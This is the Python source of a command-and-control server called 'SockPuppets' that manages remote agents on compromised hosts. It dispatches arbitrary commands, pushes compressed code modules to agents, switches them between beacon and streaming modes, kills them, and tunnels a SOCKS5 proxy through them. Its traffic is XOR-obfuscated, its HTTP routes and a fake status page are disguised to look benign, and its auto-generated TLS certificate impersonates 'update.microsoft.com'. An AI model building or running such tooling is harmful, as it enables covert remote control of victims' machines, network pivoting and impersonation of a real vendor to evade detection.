#!/usr/bin/env python3
"""
SockPuppets Server
Handles agent connections, command dispatch, and session management
Supports WebSocket, HTTP, and HTTPS transports
"""

import asyncio
import websockets
import json
import uuid
import base64
import socket
import struct
import zlib
import ssl
import os
from pathlib import Path
from datetime import datetime
from typing import Dict, Set, Optional
import logging
import threading

try:
    from aiohttp import web
except ImportError:
    web = None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Suppress noisy websockets logs
logging.getLogger('websockets').setLevel(logging.WARNING)


class Agent:
    """Represents a connected agent"""
    def __init__(self, agent_id: str, metadata: dict, transport_type: str = 'websocket'):
        self.agent_id = agent_id
        self.metadata = metadata
        self.transport_type = transport_type  # 'websocket', 'http', 'https'
        self.websocket = None  # WebSocket connection (if WS transport)
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.command_queue = asyncio.Queue()
        self.response_queue = asyncio.Queue()
        self.socks_proxy = None
        self.socks_data_queue = asyncio.Queue()
        self.mode = metadata.get('mode', 'streaming')  # 'beacon' or 'streaming'
        self.beacon_interval = metadata.get('beacon_interval', 60)
        self.beacon_jitter = metadata.get('beacon_jitter', 0)
        self.pending_results = []  # Store results from beacon checkins
        self.command_history = []  # Track commands sent
        self.command_sender_task = None  # Track send_commands task
        self.http_pending_commands = []  # Commands waiting for HTTP poll pickup

    def get_info(self) -> dict:
        info = {
            'id': self.agent_id,
            'hostname': self.metadata.get('hostname', 'Unknown'),
            'username': self.metadata.get('username', 'Unknown'),
            'os': self.metadata.get('os', 'Unknown'),
            'ip': self.metadata.get('ip', 'Unknown'),
            'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'mode': self.mode,
            'transport': self.transport_type,
            'beacon_interval': self.beacon_interval if self.mode == 'beacon' else 'N/A'
        }
        if self.mode == 'beacon' and self.beacon_jitter > 0:
            info['beacon_jitter'] = f"{self.beacon_jitter}%"
        return info

    def is_http(self) -> bool:
        return self.transport_type in ('http', 'https')


class SockPuppetsServer:
    """Main server class"""
    def __init__(self, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
        self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
        self.agents: Dict[str, Agent] = {}
        self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
        self.listeners: Dict[str, dict] = {}  # Track active listeners {name: {type, host, port, task, ...}}
        self.streaming_module = self._load_streaming_module()
        self.ws_server = None

    def _load_streaming_module(self) -> str:
        """Load and compress streaming module"""
        try:
            module_path = Path(__file__).parent / 'templates' / 'streaming_module.py'
            with open(module_path, 'r') as f:
                module_code = f.read()

            # Compress the module
            compressed = zlib.compress(module_code.encode(), level=9)
            encoded = base64.b64encode(compressed).decode()

            logger.info(f"Loaded streaming module ({len(module_code)} bytes -> {len(compressed)} bytes compressed)")
            return encoded
        except Exception as e:
            logger.error(f"Failed to load streaming module: {e}")
            return ""

    def simple_encrypt(self, data: str) -> str:
        """XOR-based obfuscation"""
        key = self.encryption_key
        encoded = data.encode('latin-1')
        encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
        return base64.b64encode(encrypted).decode()

    def simple_decrypt(self, data: str) -> str:
        """Decrypt XOR obfuscation"""
        key = self.encryption_key
        decoded = base64.b64decode(data.encode())
        decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
        return decrypted.decode('latin-1')

    # ──────────────────────────────────────────────
    # TLS Certificate Management
    # ──────────────────────────────────────────────

    def _generate_self_signed_cert(self, cert_path: str, key_path: str):
        """Generate a self-signed TLS certificate"""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime as dt

            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Microsoft Corporation"),
                x509.NameAttribute(NameOID.COMMON_NAME, "update.microsoft.com"),
            ])

            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(dt.datetime.now(dt.timezone.utc))
                .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=365))
                .sign(key, hashes.SHA256())
            )

            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))

            with open(key_path, "wb") as f:
                f.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption()
                ))

            logger.info(f"Generated self-signed certificate: {cert_path}")
            return True

        except ImportError:
            # Fallback: use openssl command
            try:
                import subprocess
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                    '-keyout', key_path, '-out', cert_path,
                    '-days', '365', '-nodes',
                    '-subj', '/CN=update.microsoft.com/O=Microsoft Corporation/C=US'
                ], capture_output=True, check=True)
                logger.info(f"Generated self-signed certificate via openssl: {cert_path}")
                return True
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.error("Cannot generate TLS cert: install 'cryptography' package or ensure 'openssl' is in PATH")
                return False

    def _get_ssl_context(self, cert_path: Optional[str] = None, key_path: Optional[str] = None) -> Optional[ssl.SSLContext]:
        """Get or create SSL context for HTTPS listener"""
        certs_dir = Path(__file__).parent / 'certs'
        certs_dir.mkdir(exist_ok=True)

        if cert_path and key_path:
            # User-provided certs
            if not Path(cert_path).exists() or not Path(key_path).exists():
                logger.error(f"Certificate files not found: {cert_path}, {key_path}")
                return None
        else:
            # Auto-generate self-signed
            cert_path = str(certs_dir / 'server.pem')
            key_path = str(certs_dir / 'server.key')

            if not Path(cert_path).exists() or not Path(key_path).exists():
                logger.info("Generating self-signed TLS certificate...")
                if not self._generate_self_signed_cert(cert_path, key_path):
                    return None

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        return ctx

    # ──────────────────────────────────────────────
    # Agent Registration (transport-agnostic)
    # ──────────────────────────────────────────────

    def register_agent_common(self, agent_id: str, metadata: dict, transport_type: str) -> Agent:
        """Register a new agent (shared by WS and HTTP handlers)"""
        agent = Agent(agent_id, metadata, transport_type)
        self.agents[agent_id] = agent
        logger.info(f"New agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')}) via {transport_type.upper()}")
        return agent

    async def register_agent(self, websocket, message: dict) -> str:
        """Register a new agent connection (WebSocket)"""
        agent_id = str(uuid.uuid4())[:8]
        metadata = message.get('metadata', {})
        metadata['ip'] = websocket.remote_address[0]

        agent = self.register_agent_common(agent_id, metadata, 'websocket')
        agent.websocket = websocket
        self.active_connections.add(websocket)

        return agent_id

    # ──────────────────────────────────────────────
    # WebSocket Handler (existing, unchanged logic)
    # ──────────────────────────────────────────────

    async def handle_agent(self, websocket, path=None):
        """Handle individual agent connection (WebSocket)"""
        agent_id = None
        try:
            async for message in websocket:
                try:
                    # Decrypt and parse message
                    decrypted = self.simple_decrypt(message)
                    data = json.loads(decrypted)

                    msg_type = data.get('type')

                    if msg_type == 'register':
                        agent_id = await self.register_agent(websocket, data)
                        response = {
                            'type': 'registered',
                            'agent_id': agent_id,
                            'status': 'success'
                        }
                        encrypted_response = self.simple_encrypt(json.dumps(response))
                        await websocket.send(encrypted_response)

                        # Start command handler for this agent
                        agent = self.agents[agent_id]
                        agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                    elif msg_type == 'checkin':
                        # Beacon checking in with existing agent_id
                        agent_id = data.get('agent_id')
                        if agent_id and agent_id in self.agents:
                            # Update existing agent's connection
                            agent = self.agents[agent_id]
                            agent.websocket = websocket
                            agent.transport_type = 'websocket'
                            agent.last_seen = datetime.now()
                            self.active_connections.add(websocket)

                            # Update metadata if provided
                            metadata = data.get('metadata', {})
                            if metadata:
                                agent.mode = metadata.get('mode', agent.mode)
                                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

                            # Restart command sender task if it died
                            if agent.command_sender_task is None or agent.command_sender_task.done():
                                logger.debug(f"Restarting command sender task for {agent_id}")
                                agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                            response = {
                                'type': 'checkin_ack',
                                'agent_id': agent_id,
                                'status': 'success'
                            }
                        else:
                            # Agent ID not found, treat as new registration
                            agent_id = await self.register_agent(websocket, data)
                            response = {
                                'type': 'registered',
                                'agent_id': agent_id,
                                'status': 'success'
                            }
                            agent = self.agents[agent_id]
                            agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                        encrypted_response = self.simple_encrypt(json.dumps(response))
                        await websocket.send(encrypted_response)

                    elif msg_type == 'heartbeat':
                        if agent_id and agent_id in self.agents:
                            self.agents[agent_id].last_seen = datetime.now()
                            response = {'type': 'heartbeat_ack', 'status': 'alive'}
                            encrypted_response = self.simple_encrypt(json.dumps(response))
                            await websocket.send(encrypted_response)

                    elif msg_type == 'response':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            output = data.get('output', '')
                            command = data.get('command', '')
                            timestamp = data.get('timestamp', '')

                            # Store result differently based on mode
                            if agent.mode == 'beacon':
                                # Beacon mode: store for later retrieval
                                agent.pending_results.append({
                                    'command': command,
                                    'output': output,
                                    'timestamp': timestamp,
                                    'received_at': datetime.now().isoformat()
                                })
                            else:
                                # Streaming mode: immediate response via queue only
                                try:
                                    agent.response_queue.put_nowait(output)
                                except asyncio.QueueFull:
                                    pass

                            agent.last_seen = datetime.now()
                            logger.debug(f"Result received from {agent_id}: {command[:50]}...")

                    elif msg_type == 'socks_data':
                        if agent_id and agent_id in self.agents:
                            await self.agents[agent_id].socks_data_queue.put(data.get('data', b''))
                            self.agents[agent_id].last_seen = datetime.now()

                    elif msg_type == 'mode_change':
                        if agent_id and agent_id in self.agents:
                            new_mode = data.get('mode', 'streaming')
                            self.agents[agent_id].mode = new_mode
                            self.agents[agent_id].last_seen = datetime.now()
                            logger.info(f"Agent {agent_id} switched to {new_mode} mode")

                    elif msg_type == 'upgrade_failed':
                        if agent_id and agent_id in self.agents:
                            logger.warning(f"Agent {agent_id} failed to upgrade to WebSocket, continuing HTTP")

                except json.JSONDecodeError:
                    logger.error("Failed to decode message")
                except Exception as e:
                    logger.error(f"Error processing message: {e}")

        except websockets.exceptions.ConnectionClosed:
            pass  # Silent disconnect
        finally:
            if agent_id and agent_id in self.agents:
                self.active_connections.discard(websocket)
                # Don't remove agent immediately to preserve session info

    async def send_commands(self, agent_id: str):
        """Send queued commands to agent (WebSocket transport)"""
        if agent_id not in self.agents:
            return

        agent = self.agents[agent_id]

        # HTTP agents don't use this task — commands are delivered via poll response
        if agent.is_http():
            return

        try:
            while True:
                command = await agent.command_queue.get()

                message = {
                    'type': 'command',
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }

                encrypted = self.simple_encrypt(json.dumps(message))

                # For beacon mode, retry sending if connection is closed
                max_retries = 30 if agent.mode == 'beacon' else 1
                for attempt in range(max_retries):
                    try:
                        if agent.websocket in self.active_connections:
                            await agent.websocket.send(encrypted)
                            logger.info(f"Command sent to {agent_id}: {command}")
                            break
                        else:
                            # Beacon is disconnected, wait for it to check in
                            if attempt < max_retries - 1:
                                await asyncio.sleep(1)
                            else:
                                logger.warning(f"Command timeout for {agent_id}, beacon didn't check in")
                    except websockets.exceptions.ConnectionClosed:
                        if attempt < max_retries - 1:
                            # Wait for beacon to reconnect
                            await asyncio.sleep(1)
                        else:
                            logger.warning(f"Failed to send command to {agent_id} after {max_retries} attempts")
                            break

        except Exception as e:
            logger.error(f"Error in send_commands for {agent_id}: {e}")

    # ──────────────────────────────────────────────
    # HTTP/HTTPS Handler (aiohttp)
    # ──────────────────────────────────────────────

    def _create_http_app(self) -> 'web.Application':
        """Create aiohttp application with disguised routes"""
        if web is None:
            raise ImportError("aiohttp is required for HTTP/HTTPS listeners. Install with: pip install aiohttp")

        app = web.Application()
        app.router.add_post('/submit-form', self._http_handle_register)
        app.router.add_post('/api/v1/update', self._http_handle_checkin)
        app.router.add_post('/upload', self._http_handle_results)
        app.router.add_get('/health', self._http_handle_heartbeat)
        # Serve a fake index page for browser visits
        app.router.add_get('/', self._http_handle_index)
        return app

    async def _http_handle_index(self, request: 'web.Request') -> 'web.Response':
        """Serve a fake page for browser visitors"""
        html = """<!DOCTYPE html>
<html><head><title>Service Status</title></head>
<body><h1>Service is running</h1><p>All systems operational.</p></body></html>"""
        return web.Response(text=html, content_type='text/html')

    async def _http_handle_register(self, request: 'web.Request') -> 'web.Response':
        """Handle agent registration via HTTP POST"""
        try:
            body = await request.text()
            decrypted = self.simple_decrypt(body)
            data = json.loads(decrypted)

            msg_type = data.get('type')
            if msg_type != 'register':
                return web.Response(status=400)

            agent_id = str(uuid.uuid4())[:8]
            metadata = data.get('metadata', {})

            # Get client IP
            peername = request.remote
            metadata['ip'] = peername or 'Unknown'

            # Determine transport type from request scheme
            transport_type = 'https' if request.secure else 'http'

            agent = self.register_agent_common(agent_id, metadata, transport_type)

            response = {
                'type': 'registered',
                'agent_id': agent_id,
                'status': 'success'
            }
            encrypted_response = self.simple_encrypt(json.dumps(response))
            return web.Response(text=encrypted_response, content_type='text/html')

        except Exception as e:
            logger.error(f"HTTP register error: {e}")
            return web.Response(status=500)

    async def _http_handle_checkin(self, request: 'web.Request') -> 'web.Response':
        """Handle agent checkin/poll via HTTP POST (beacon or long-poll)"""
        try:
            body = await request.text()
            decrypted = self.simple_decrypt(body)
            data = json.loads(decrypted)

            msg_type = data.get('type')
            agent_id = data.get('agent_id')

            if msg_type == 'checkin' and agent_id:
                if agent_id in self.agents:
                    agent = self.agents[agent_id]
                    agent.last_seen = datetime.now()

                    # Update transport type if changed
                    transport_type = 'https' if request.secure else 'http'
                    agent.transport_type = transport_type

                    # Update metadata if provided
                    metadata = data.get('metadata', {})
                    if metadata:
                        agent.mode = metadata.get('mode', agent.mode)
                        agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                        agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

                    # Process any results sent with the checkin
                    results = data.get('results', [])
                    for result in results:
                        output = result.get('output', '')
                        command = result.get('command', '')
                        timestamp = result.get('timestamp', '')

                        if agent.mode == 'beacon':
                            agent.pending_results.append({
                                'command': command,
                                'output': output,
                                'timestamp': timestamp,
                                'received_at': datetime.now().isoformat()
                            })
                        else:
                            try:
                                agent.response_queue.put_nowait(output)
                            except asyncio.QueueFull:
                                pass

                    # Collect commands to send back
                    commands = []

                    if agent.mode == 'beacon':
                        # Beacon mode: drain all queued commands immediately
                        while not agent.command_queue.empty():
                            try:
                                cmd = agent.command_queue.get_nowait()
                                commands.append({
                                    'type': 'command',
                                    'command': cmd,
                                    'timestamp': datetime.now().isoformat()
                                })
                                logger.info(f"HTTP command sent to {agent_id}: {cmd}")
                            except asyncio.QueueEmpty:
                                break
                    else:
                        # Long-poll mode: wait up to 30s for a command
                        try:
                            cmd = await asyncio.wait_for(agent.command_queue.get(), timeout=30.0)
                            commands.append({
                                'type': 'command',
                                'command': cmd,
                                'timestamp': datetime.now().isoformat()
                            })
                            logger.info(f"HTTP long-poll command sent to {agent_id}: {cmd}")
                        except asyncio.TimeoutError:
                            pass  # No commands, return empty

                    if commands:
                        response = {
                            'type': 'commands',
                            'commands': commands
                        }
                    else:
                        response = {
                            'type': 'no_commands'
                        }

                    encrypted_response = self.simple_encrypt(json.dumps(response))
                    return web.Response(text=encrypted_response, content_type='text/html')

                else:
                    # Unknown agent_id — re-register
                    new_id = str(uuid.uuid4())[:8]
                    metadata = data.get('metadata', {})
                    peername = request.remote
                    metadata['ip'] = peername or 'Unknown'
                    transport_type = 'https' if request.secure else 'http'
                    self.register_agent_common(new_id, metadata, transport_type)

                    response = {
                        'type': 'registered',
                        'agent_id': new_id,
                        'status': 'success'
                    }
                    encrypted_response = self.simple_encrypt(json.dumps(response))
                    return web.Response(text=encrypted_response, content_type='text/html')

            return web.Response(status=400)

        except Exception as e:
            logger.error(f"HTTP checkin error: {e}")
            return web.Response(status=500)

    async def _http_handle_results(self, request: 'web.Request') -> 'web.Response':
        """Handle command results via HTTP POST"""
        try:
            body = await request.text()
            decrypted = self.simple_decrypt(body)
            data = json.loads(decrypted)

            agent_id = data.get('agent_id')
            if not agent_id or agent_id not in self.agents:
                return web.Response(status=404)

            agent = self.agents[agent_id]
            agent.last_seen = datetime.now()

            output = data.get('output', '')
            command = data.get('command', '')
            timestamp = data.get('timestamp', '')

            if agent.mode == 'beacon':
                agent.pending_results.append({
                    'command': command,
                    'output': output,
                    'timestamp': timestamp,
                    'received_at': datetime.now().isoformat()
                })
            else:
                try:
                    agent.response_queue.put_nowait(output)
                except asyncio.QueueFull:
                    pass

            logger.debug(f"HTTP result received from {agent_id}: {command[:50]}...")

            response = {'type': 'result_ack', 'status': 'success'}
            encrypted_response = self.simple_encrypt(json.dumps(response))
            return web.Response(text=encrypted_response, content_type='text/html')

        except Exception as e:
            logger.error(f"HTTP results error: {e}")
            return web.Response(status=500)

    async def _http_handle_heartbeat(self, request: 'web.Request') -> 'web.Response':
        """Handle heartbeat via HTTP GET"""
        # Check for agent_id in query params (disguised as session token)
        agent_id = request.query.get('sid', '')

        if agent_id and agent_id in self.agents:
            self.agents[agent_id].last_seen = datetime.now()

        # Always return a normal-looking health response
        response = {'type': 'heartbeat_ack', 'status': 'alive'}
        encrypted_response = self.simple_encrypt(json.dumps(response))
        return web.Response(text=encrypted_response, content_type='text/html')

    # ──────────────────────────────────────────────
    # Command dispatch (transport-agnostic)
    # ──────────────────────────────────────────────

    async def send_command_to_agent(self, agent_id: str, command: str) -> str:
        """Queue command for agent and wait for response"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        # Track command
        agent.command_history.append({
            'command': command,
            'queued_at': datetime.now().isoformat()
        })

        # Queue the command
        await agent.command_queue.put(command)

        # For beacon mode, return immediately
        if agent.mode == 'beacon':
            transport_note = f" via {agent.transport_type.upper()}" if agent.is_http() else ""
            return f"[*] Command queued for beacon{transport_note} (will execute on next checkin in ~{agent.beacon_interval}s)"

        # For HTTP streaming (long-poll), command will be picked up on next poll
        if agent.is_http():
            try:
                response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
                return response
            except asyncio.TimeoutError:
                return "Command timeout - no response from agent (HTTP long-poll)"

        # For WebSocket streaming mode, wait for response
        if agent.websocket not in self.active_connections:
            return "Agent is not connected"

        try:
            response = await asyncio.wait_for(agent.response_queue.get(), timeout=30.0)
            return response
        except asyncio.TimeoutError:
            return "Command timeout - no response from agent"

    def get_agent_list(self) -> list:
        """Get list of all agents"""
        return [agent.get_info() for agent in self.agents.values()]

    def get_active_agents(self) -> list:
        """Get list of active agents"""
        active = []
        for agent in self.agents.values():
            if agent.is_http():
                # HTTP agent is active if seen recently
                if agent.mode == 'beacon':
                    max_interval = agent.beacon_interval * 2 + 60
                else:
                    max_interval = 90  # Long-poll timeout + buffer
                time_since = (datetime.now() - agent.last_seen).total_seconds()
                if time_since < max_interval:
                    active.append(agent.get_info())
            else:
                if agent.websocket in self.active_connections:
                    active.append(agent.get_info())
        return active

    def get_agent_results(self, agent_id: str, clear: bool = False) -> list:
        """Get pending results from agent"""
        if agent_id not in self.agents:
            return []

        agent = self.agents[agent_id]
        results = agent.pending_results.copy()

        if clear:
            agent.pending_results.clear()

        return results

    def check_agent_health(self, agent_id: str) -> str:
        """Check if beacon agent might be dead"""
        if agent_id not in self.agents:
            return ""

        agent = self.agents[agent_id]

        # Only check beacons
        if agent.mode != 'beacon':
            return ""

        # Calculate max expected time between checkins
        beacon_interval = agent.beacon_interval
        beacon_jitter_percent = agent.beacon_jitter

        # Max interval = base + jitter + 3 minute grace period
        jitter_seconds = beacon_interval * (beacon_jitter_percent / 100.0)
        max_expected_interval = beacon_interval + jitter_seconds + 180  # 3 minutes grace

        # Check time since last seen
        time_since_last_seen = (datetime.now() - agent.last_seen).total_seconds()

        if time_since_last_seen > max_expected_interval:
            return f"Agent {agent_id} may be dead (last seen {int(time_since_last_seen/60)} minutes ago, expected checkin every {beacon_interval}s)"

        return ""

    async def set_beacon_interval(self, agent_id: str, interval: int) -> str:
        """Set beacon sleep interval for agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]
        agent.beacon_interval = interval

        if agent.is_http():
            # For HTTP agents, queue a set_interval command for next poll
            await agent.command_queue.put(f"__set_interval:{interval}")
            return f"Beacon interval command queued (will apply on next checkin)"

        message = {
            'type': 'set_interval',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        # For beacon mode, wait for agent to check in
        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Set beacon interval for {agent_id} to {interval}s")
                    return f"Beacon interval set to {interval} seconds"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Failed - connection closed"

        return "Failed to set beacon interval"

    async def upgrade_to_streaming(self, agent_id: str) -> str:
        """Upgrade agent from beacon to streaming mode"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'streaming':
            return "Agent is already in streaming mode"

        if agent.is_http():
            # For HTTP agents, upgrade means switching to long-poll mode
            agent.mode = 'streaming'
            logger.info(f"Agent {agent_id} upgraded to streaming/long-poll mode via {agent.transport_type.upper()}")
            return f"Agent upgraded to streaming mode (HTTP long-poll)"

        if not self.streaming_module:
            return "Error: Streaming module not available"

        # WebSocket: send upgrade command with streaming module
        message = {
            'type': 'upgrade_mode',
            'mode': 'streaming',
            'module_code': self.streaming_module
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    agent.mode = 'streaming'
                    logger.info(f"Agent {agent_id} upgraded to streaming mode (staged module: {len(self.streaming_module)} bytes)")
                    return f"Agent upgraded to streaming mode (loaded {len(self.streaming_module)} byte module)"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Upgrade timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Upgrade failed - connection closed"

        return "Upgrade failed"

    async def upgrade_to_websocket(self, agent_id: str, ws_host: str = None, ws_port: int = None) -> str:
        """Upgrade HTTP agent to WebSocket transport"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if not agent.is_http():
            return "Agent is already using WebSocket transport"

        # Find the WebSocket listener to get its host/port
        if ws_host is None or ws_port is None:
            for name, info in self.listeners.items():
                if info['type'] == 'websocket':
                    ws_host = info['host']
                    ws_port = info['port']
                    break

        if ws_host is None or ws_port is None:
            return "No WebSocket listener running. Start one first with 'start [host] [port]'"

        # Queue upgrade command for the HTTP agent
        upgrade_cmd = json.dumps({
            'type': 'upgrade_websocket',
            'ws_host': ws_host,
            'ws_port': ws_port
        })
        await agent.command_queue.put(f"__upgrade_ws:{upgrade_cmd}")
        return f"WebSocket upgrade command queued (agent will connect to ws://{ws_host}:{ws_port})"

    async def downgrade_to_beacon(self, agent_id: str, interval: int = 60) -> str:
        """Downgrade agent from streaming to beacon mode"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'beacon':
            return "Agent is already in beacon mode"

        if agent.is_http():
            # For HTTP agents, just switch mode
            agent.mode = 'beacon'
            agent.beacon_interval = interval
            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s) via {agent.transport_type.upper()}")
            return f"Agent downgraded to beacon mode ({interval}s interval)"

        if agent.websocket not in self.active_connections:
            return "Agent not connected (cannot downgrade)"

        message = {
            'type': 'downgrade_mode',
            'mode': 'beacon',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        try:
            await agent.websocket.send(encrypted)
            agent.mode = 'beacon'
            agent.beacon_interval = interval
            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s)")
            return f"Agent downgraded to beacon mode ({interval}s interval)"
        except websockets.exceptions.ConnectionClosed:
            return "Downgrade failed - connection closed"

    async def kill_agent(self, agent_id: str) -> str:
        """Send kill command to terminate agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.is_http():
            # Queue kill command for next HTTP poll
            await agent.command_queue.put("__kill")
            # Remove agent from tracking
            del self.agents[agent_id]
            return f"Agent {agent_id} kill command queued (will terminate on next checkin)"

        message = {
            'type': 'kill',
            'command': 'terminate'
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Kill command sent to {agent_id}")

                    if agent.websocket in self.active_connections:
                        self.active_connections.discard(agent.websocket)
                    del self.agents[agent_id]

                    return f"Agent {agent_id} killed successfully"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        if agent_id in self.agents:
                            del self.agents[agent_id]
                        return f"Kill timeout - agent didn't check in (removed from tracking)"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    if agent_id in self.agents:
                        del self.agents[agent_id]
                    return f"Agent connection closed (removed from tracking)"

        return "Failed to kill agent"

    async def start_socks_proxy(self, agent_id: str, local_port: int) -> str:
        """Start SOCKS5 proxy through agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.is_http():
            return "SOCKS proxy is not supported over HTTP transport (requires WebSocket)"

        if agent.websocket not in self.active_connections:
            return "Agent not connected"

        if agent.socks_proxy is not None:
            return f"SOCKS proxy already running on port {agent.socks_proxy}"

        try:
            agent.socks_proxy = local_port
            asyncio.create_task(self._run_socks_server(agent_id, local_port))

            message = {
                'type': 'socks_init',
                'port': local_port
            }
            encrypted = self.simple_encrypt(json.dumps(message))
            await agent.websocket.send(encrypted)

            logger.info(f"SOCKS proxy started for {agent_id} on port {local_port}")
            return f"SOCKS proxy started on 127.0.0.1:{local_port}"

        except Exception as e:
            agent.socks_proxy = None
            return f"Failed to start SOCKS proxy: {str(e)}"

    async def _run_socks_server(self, agent_id: str, port: int):
        """Run SOCKS5 server"""
        server = await asyncio.start_server(
            lambda r, w: self._handle_socks_client(agent_id, r, w),
            '127.0.0.1', port
        )
        logger.info(f"SOCKS server listening on 127.0.0.1:{port}")
        async with server:
            await server.serve_forever()

    async def _handle_socks_client(self, agent_id: str, reader, writer):
        """Handle SOCKS5 client connection"""
        try:
            agent = self.agents.get(agent_id)
            if not agent or agent.websocket not in self.active_connections:
                writer.close()
                await writer.wait_closed()
                return

            # SOCKS5 handshake
            data = await reader.read(262)
            if len(data) < 2 or data[0] != 0x05:
                writer.close()
                await writer.wait_closed()
                return

            # No authentication
            writer.write(b'\x05\x00')
            await writer.drain()

            # Get request
            data = await reader.read(4)
            if len(data) != 4:
                writer.close()
                await writer.wait_closed()
                return

            cmd, atyp = data[1], data[3]

            if atyp == 0x01:  # IPv4
                addr_data = await reader.read(6)
                addr = socket.inet_ntoa(addr_data[:4])
                port = struct.unpack('>H', addr_data[4:])[0]
            elif atyp == 0x03:  # Domain
                addr_len = (await reader.read(1))[0]
                addr_data = await reader.read(addr_len + 2)
                addr = addr_data[:addr_len].decode()
                port = struct.unpack('>H', addr_data[addr_len:])[0]
            elif atyp == 0x04:  # IPv6
                addr_data = await reader.read(18)
                addr = socket.inet_ntop(socket.AF_INET6, addr_data[:16])
                port = struct.unpack('>H', addr_data[16:])[0]
            else:
                writer.write(b'\x05\x08\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                return

            conn_msg = {
                'type': 'socks_connect',
                'host': addr,
                'port': port
            }
            encrypted = self.simple_encrypt(json.dumps(conn_msg))
            await agent.websocket.send(encrypted)

            writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
            await writer.drain()

            await asyncio.gather(
                self._relay_socks_to_agent(agent, reader),
                self._relay_agent_to_socks(agent, writer)
            )

        except Exception as e:
            logger.error(f"SOCKS client error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def _relay_socks_to_agent(self, agent: Agent, reader):
        """Relay data from SOCKS client to agent"""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                msg = {
                    'type': 'socks_send',
                    'data': base64.b64encode(data).decode()
                }
                encrypted = self.simple_encrypt(json.dumps(msg))
                await agent.websocket.send(encrypted)
        except Exception as e:
            logger.error(f"Relay to agent error: {e}")

    async def _relay_agent_to_socks(self, agent: Agent, writer):
        """Relay data from agent to SOCKS client"""
        try:
            while True:
                data = await agent.socks_data_queue.get()
                if isinstance(data, str):
                    data = base64.b64decode(data)
                writer.write(data)
                await writer.drain()
        except Exception as e:
            logger.error(f"Relay to SOCKS error: {e}")

    # ──────────────────────────────────────────────
    # Listener Management
    # ──────────────────────────────────────────────

